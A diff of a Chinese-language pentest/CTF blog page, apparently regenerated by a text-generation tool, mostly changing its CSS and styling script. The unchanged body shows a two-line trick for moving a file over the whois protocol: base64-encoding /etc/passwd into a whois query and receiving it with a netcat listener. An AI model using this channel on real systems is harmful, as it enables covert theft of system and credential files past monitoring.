@@ -1,104 +1,119 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>利用Whois传输小文件。 - CTF - Gemini TextGenerate</title>
-    <meta name="description" content="渗透安全" />
-    <meta name="keywords" content="whois 渗透" />
-    <style>
-        body {
-            background-color: #000000; /* Unix风格 */
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            max-width: 820px;
-            margin: 0 auto;
-            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        h1, h2, h3, h4, h5, h6 {
-            text-align: center;
-            font-weight: normal;
-        }
-        h1 { font-size: 20px; }
-        h2 { font-size: 18px; }
-        h3 { font-size: 16px; }
-        h4 { font-size: 14px; }
-        h5 { font-size: 12px; }
-        h6 { font-size: 11px; }
-        pre {
-            background-color: #222222;
-            padding: 10px;
-            border-radius: 4px;
-            overflow-x: auto;
-            font-family: monospace;
-        }
-        code {
-            background-color: #333333;
-            padding: 2px 4px;
-            border-radius: 4px;
-            font-family: monospace;
-            color: #80ff80; /* 绿色高亮 */
-        }
-        .container {
-            padding: 20px;
-        }
-        footer {
-            text-align: center;
-            padding: 10px 0;
-            font-size: 12px;
-            color: #808080;
-        }
-        a {
-            color: #80ff80; /* 绿色链接 */
-            text-decoration: none;
-        }
-        a:hover {
-            text-decoration: underline;
-        }
-    </style>
-    <script>
-        window.onload = function() {
-            // 获取当前时间
-            var now = new Date();
-            var hour = now.getHours();
+<meta charset="UTF-8">
+<title>利用Whois传输小文件。</title>
+<meta name="description" content="渗透安全" />
+<meta name="keywords" content="whois 渗透" />
+<style>
+body {
+  background-color: #000000;
+  color: #00ff00;
+  font-family: monospace;
+  text-align: center;
+  max-width: 820px;
+  margin: 0 auto;
+  padding: 20px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+}
 
-            // 判断时间并设置背景色
-            if (hour >= 6 && hour < 18) {
-                document.body.style.backgroundColor = '#ffffff'; // 白天模式
-                document.body.style.color = '#000000';
-            } else {
-                document.body.style.backgroundColor = '#000000'; // 夜晚模式
-                document.body.style.color = '#ffffff';
-            }
+h1 {
+  font-size: 20px;
+  margin-bottom: 10px;
+}
 
-            // 代码高亮
-            var codeBlocks = document.querySelectorAll('pre code');
-            for (var i = 0; i < codeBlocks.length; i++) {
-                codeBlocks[i].style.backgroundColor = '#333333';
-                codeBlocks[i].style.color = '#80ff80';
-            }
-        };
-    </script>
+h2 {
+  font-size: 18px;
+  margin-bottom: 8px;
+}
+
+h3 {
+  font-size: 16px;
+  margin-bottom: 6px;
+}
+
+h4 {
+  font-size: 14px;
+  margin-bottom: 4px;
+}
+
+h5 {
+  font-size: 12px;
+  margin-bottom: 2px;
+}
+
+h6 {
+  font-size: 11px;
+  margin-bottom: 1px;
+}
+
+p {
+  line-height: 21px;
+  margin-bottom: 15px;
+}
+
+code {
+  background-color: #00ff00;
+  color: #000000;
+  font-family: monospace;
+  line-height: 24px;
+  padding: 2px 4px;
+  border-radius: 4px;
+}
+
+pre {
+  background-color: #00ff00;
+  color: #000000;
+  font-family: monospace;
+  padding: 10px;
+  border-radius: 4px;
+}
+
+img {
+  display: block;
+  margin: 0 auto;
+  max-width: 600px;
+  height: auto;
+}
+
+footer {
+  text-align: center;
+  margin-top: 20px;
+  font-size: 12px;
+}
+
+.highlight {
+  background-color: #00ff00;
+  color: #000000;
+  padding: 2px 4px;
+  border-radius: 4px;
+}
+</style>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    var codeElements = document.querySelectorAll("code");
+    codeElements.forEach(function(element) {
+      element.classList.add("highlight");
+    });
+
+    var preElements = document.querySelectorAll("pre");
+    preElements.forEach(function(element) {
+      element.classList.add("highlight");
+    });
+  });
+</script>
 </head>
 <body>
-    <div class="container">
-        <h1>利用Whois传输小文件。</h1>
-        <h2>CTF</h2>
-        <h3>2019-09-02 10:03:13 +0800</h3>
-        <p>渗透安全</p>
-
-        <pre><code>传输机：
+<h1>利用Whois传输小文件。</h1>
+<p>渗透安全</p>
+<pre><code>传输机：
 root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`
 接受机：
 root@john:/tmp# nc -l -v -p 4444 | sed "s/ //g" | base64 -d
 </code></pre>
-
-        <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
-    </div>
-    <footer>
-        Power By Gemini TextGenerate 2024-09-16 22:09:52
-    </footer>
+<p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
+<footer>
+  Power By Gemini TextGenerate 2024-09-17 00:54:31
+</footer>
 </body>
 </html>
